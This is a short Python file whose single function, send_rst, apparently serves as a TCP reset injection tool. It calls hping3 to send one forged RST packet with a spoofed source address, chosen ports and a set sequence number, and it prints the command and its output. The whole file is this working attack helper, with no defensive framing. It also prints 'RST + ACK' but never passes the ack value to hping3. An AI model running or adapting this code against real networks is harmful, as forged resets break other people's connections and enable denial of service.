import subprocess


def send_rst(source_ip, source_port, destination_ip, destination_port, seq, ack):
    print("\n========== RST PACKET ==========")
    print(f"Source      : {source_ip}:{source_port}")
    print(f"Destination : {destination_ip}:{destination_port}")

    print(f"SEQ         : {seq}")
    print(f"ACK         : {ack}")
    print("Flags       : RST + ACK")
    print("================================")

    command = [
        "hping3",
        "--count", "1",
        "-a", source_ip, destination_ip,
        "--baseport", str(source_port),
        "--destport", str(destination_port),
        "--setseq", str(seq),
        "--rst"
    ]

    print("\n[+] Executing hping3...")
    print("[+] Command: ", " ".join(command))

    result = subprocess.run(
        command,
        capture_output=True,
        text=True,
        check=True
    )

    print("\n========== HPING3 OUTPUT ==========")
    print(result.stdout)

    if result.stderr:
        print(result.stderr)

    print("====================================")


